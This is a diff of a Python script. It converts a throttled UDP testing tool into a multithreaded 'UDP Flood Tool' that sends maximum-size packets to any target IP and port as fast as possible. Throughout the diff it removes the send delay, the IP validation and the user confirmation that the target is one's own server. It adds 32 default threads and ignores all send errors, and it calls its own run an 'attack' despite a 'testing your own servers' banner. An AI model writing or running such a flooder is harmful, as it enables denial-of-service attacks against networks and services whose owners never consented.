@@ -1,15 +1,7 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
 """
-UDP Network Testing Tool
-
-This script sends UDP packets to a specified IP address and port for a given duration.
-It's designed for legitimate network testing of your own servers.
-
-Usage:
-    python udp_client.py <target_ip> <port> <duration_seconds>
-
-Example:
-    python udp_client.py 192.168.1.100 8080 10
+High-Performance UDP Flood Tool for Network Testing
+For testing your own servers only
 """
 
 import socket
@@ -17,52 +9,45 @@ import sys
 import time
 import random
 import string
-import argparse
-from datetime import datetime
+import threading
 
-def generate_random_data(size=1024):
+# Generate a single large payload once to reuse
+def generate_random_data(size=65507):  # Maximum UDP packet size
     """Generate random string data of specified size."""
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))
 
-def send_udp_packets(target_ip, port, duration):
-    """
-    Send UDP packets to the target IP and port for the specified duration.
-    
-    Args:
-        target_ip (str): Target IP address
-        port (int): Target port
-        duration (int): Duration in seconds to send packets
-    """
-    # Create UDP socket
+# Pre-generate payload for maximum performance
+PAYLOAD = generate_random_data().encode('utf-8')
+
+def send_udp_packets(target_ip, port, duration, thread_id=0):
+    """Send UDP packets to the target IP and port at maximum rate."""
+    # Create UDP socket with optimized buffer
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    # Generate some random data to send
-    data = generate_random_data().encode('utf-8')
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507 * 1024)  # Larger send buffer
     
     # Calculate end time
     end_time = time.time() + duration
     packets_sent = 0
     
-    print(f"[*] Starting UDP packet transmission to {target_ip}:{port}")
-    print(f"[*] Test will run for {duration} seconds")
-    print(f"[*] Press Ctrl+C to stop before the duration completes")
+    print("[*] Thread %d starting attack to %s:%s" % (thread_id, target_ip, port))
     
     start_time = time.time()
     
     try:
-        # Send packets until duration is reached
+        # Send packets until duration is reached - as fast as possible
         while time.time() < end_time:
-            sock.sendto(data, (target_ip, port))
-            packets_sent += 1
-            
-            # Print status every second
-            if packets_sent % 100 == 0:
-                elapsed = time.time() - start_time
-                print(f"[+] Sent {packets_sent} packets in {elapsed:.2f} seconds "
-                      f"({packets_sent/elapsed:.2f} packets/sec)")
-            
-            # Small delay to prevent overwhelming local resources
-            time.sleep(0.001)
+            try:
+                sock.sendto(PAYLOAD, (target_ip, port))
+                packets_sent += 1
+                
+                # Print status every 100000 packets (only from thread 0)
+                if thread_id == 0 and packets_sent % 100000 == 0:
+                    elapsed = time.time() - start_time
+                    print("[+] Sent %s packets in %.2f seconds (%.2f packets/sec)" % 
+                          (packets_sent, elapsed, packets_sent/elapsed))
+            except:
+                # Just continue if any error occurs
+                continue
             
     except KeyboardInterrupt:
         print("\n[!] Test interrupted by user")
@@ -70,61 +55,72 @@ def send_udp_packets(target_ip, port, duration):
         # Close the socket
         sock.close()
         
-        # Calculate and display statistics
+        # Return statistics
         total_time = time.time() - start_time
-        print("\n--- Test Results ---")
-        print(f"Target: {target_ip}:{port}")
-        print(f"Duration: {total_time:.2f} seconds")
-        print(f"Packets sent: {packets_sent}")
-        print(f"Rate: {packets_sent/total_time:.2f} packets/second")
-        print(f"Approximate data sent: {(packets_sent * len(data)) / (1024*1024):.2f} MB")
+        return packets_sent, total_time, len(PAYLOAD) * packets_sent
 
-def validate_ip(ip):
-    """Validate IP address format."""
+def run_threads(target_ip, port, duration, num_threads=32):
+    """Run multiple threads for maximum performance testing."""
+    threads = []
+    
+    print("[*] Starting attack with %d threads" % num_threads)
+    print("[*] Packet size: %d bytes (maximum)" % len(PAYLOAD))
+    print("[*] Target: %s:%s" % (target_ip, port))
+    print("[*] Duration: %d seconds" % duration)
+    print("[*] Press Ctrl+C to stop before the duration completes")
+    
+    # Start all threads
+    for i in range(num_threads):
+        thread = threading.Thread(
+            target=send_udp_packets,
+            args=(target_ip, port, duration, i)
+        )
+        thread.daemon = True  # Set as daemon so they exit when main thread exits
+        threads.append(thread)
+        thread.start()
+    
+    # Wait for duration
     try:
-        socket.inet_aton(ip)
-        return True
-    except socket.error:
-        return False
+        time.sleep(duration)
+    except KeyboardInterrupt:
+        print("\n[!] Attack interrupted by user")
+    
+    # Final status message
+    print("\n[*] Attack completed")
 
 def main():
     """Main function to parse arguments and start the test."""
-    parser = argparse.ArgumentParser(
-        description="UDP Network Testing Tool - For testing your own servers only"
-    )
-    parser.add_argument("target_ip", help="Target IP address")
-    parser.add_argument("port", type=int, help="Target port number")
-    parser.add_argument("duration", type=int, help="Test duration in seconds")
+    if len(sys.argv) < 4:
+        print("Usage: python test.py <target_ip> <port> <duration> [threads]")
+        print("Example: python test.py 192.168.1.100 8080 30 64")
+        sys.exit(1)
     
-    args = parser.parse_args()
+    # Parse command line arguments
+    target_ip = sys.argv[1]
+    port = int(sys.argv[2])
+    duration = int(sys.argv[3])
+    
+    # Optional thread count (default to 32 for maximum performance)
+    num_threads = int(sys.argv[4]) if len(sys.argv) > 4 else 32
     
     # Validate inputs
-    if not validate_ip(args.target_ip):
-        print("[!] Error: Invalid IP address format")
-        sys.exit(1)
-        
-    if args.port < 1 or args.port > 65535:
+    if port < 1 or port > 65535:
         print("[!] Error: Port must be between 1 and 65535")
         sys.exit(1)
         
-    if args.duration < 1:
+    if duration < 1:
         print("[!] Error: Duration must be at least 1 second")
         sys.exit(1)
     
-    # Display warning and confirmation
+    # Display warning
     print("\n" + "="*60)
+    print("HIGH-PERFORMANCE UDP ATTACK TOOL")
     print("WARNING: This tool is for legitimate network testing purposes only.")
     print("You should only use this against servers you own or have permission to test.")
-    print("Unauthorized testing against third-party servers may be illegal.")
     print("="*60 + "\n")
     
-    confirmation = input("Do you confirm you're testing your own server? (yes/no): ")
-    if confirmation.lower() != "yes":
-        print("[!] Test aborted by user")
-        sys.exit(0)
-    
-    # Start the test
-    send_udp_packets(args.target_ip, args.port, args.duration)
+    # Start the test with maximum performance
+    run_threads(target_ip, port, duration, num_threads)
 
 if __name__ == "__main__":
     main()
